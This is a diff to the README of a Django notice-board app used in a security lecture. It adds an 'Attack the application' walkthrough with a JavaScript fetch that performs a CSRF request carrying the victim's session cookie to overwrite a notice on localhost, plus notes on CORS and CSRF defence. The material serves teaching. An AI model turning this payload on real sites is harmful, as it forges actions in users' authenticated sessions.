@@ -4,14 +4,17 @@
 
 1. [Overview](#overview)
 2. [Installation](#installation)
-3. [Features](#features)
-4. [What have I learned?](#what-have-i-learned)
+3. [Attack the application](#attack-the-application)
+4. [Features](#features)
+5. [What have I learned?](#what-have-i-learned)
 
 ## Overview
 
-board is a minimalist notice board built using [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML), [Tailwind CSS](https://tailwindcss.com/), [Django](https://www.djangoproject.com/), [MySQL](https://www.mysql.com/) and [Docker](https://www.docker.com/). This web application was used to give a lecture on the operation of Django and its security mechanisms.
+board is a minimalist notice board built using [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML), [Tailwind CSS](https://tailwindcss.com/), [Django](https://www.djangoproject.com/), [MySQL](https://www.mysql.com/) and [Docker](https://www.docker.com/). 
 
-### Demonstration
+This web application was used to give a lecture on the operation of Django and its security mechanisms. This lecture covers topics such as user authentication, URL protection, Middleware, CORS and CSRF Attack and Defense strategies.
+
+### Demonstration of the application
 
 <video src="https://github.com/antonioalanxs/board/assets/79718376/a3d8ddd6-486b-4007-bb52-db1aba3a1e6f" alt="Demonstration"></video>
 
@@ -51,6 +54,31 @@ docker compose down
 ```
 
 The application was turned off.
+
+## Attack the application
+
+1.  [Run the application](#run-the-application) and log in with an [user](#sample-users). This will cause the browser to save its `sessionid`.
+  
+2.  Select the `slug` of the notice that you want to edit attacking it. You can do this using [phpMyAdmin](http://localhost:8080) or by looking at the notice URL.
+
+3.  Change current working directory to `attack-server` and Run Attack Server (e.g., `python -m http.server 5000`).
+
+4.  The Attack Server will edit the notice by fetching its URL including the necessary cookies (stored in the browser previously when logging in, `sessionid`) so that the request is not denied.
+```javascript
+const slug = "3e2e62cf-35f2-4d8e-9244-8649a4748c52" // Example notice slug
+
+fetch(`http://localhost:8000/update/${slug}`, {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: "title=attacker&content=attacker"
+})
+    .then(res => res.text())
+    .then(text => console.log(text))
+    .catch(err => console.error(err));
+```
 
 ## Features
 
@@ -98,4 +126,9 @@ The application was turned off.
 
 - **Middleware utilization**: Learned how to use middlewares in the context of Django, allowing customization and extension of web application's behavior.
 
+- **Understanding CORS (Cross-Origin Resource Sharing)**: Acquired knowledge about how CORS works and its significance in web development. Learned how to handle and configure CORS to enable secure communication between different origins in the context of web applications.
+
+- **CSRF Attack and Defense Strategies**: Explored the concept of Cross-Site Request Forgery (CSRF) attacks and gained insights into both launching and defending against such attacks. Developed strategies to implement CSRF protection measures in web applications, ensuring the security of user data and interactions.
+
 - **Enhanced communication skills**: Strengthened communication abilities through giving the lecture, enhancing my ability to communicate ideas effectively.
+
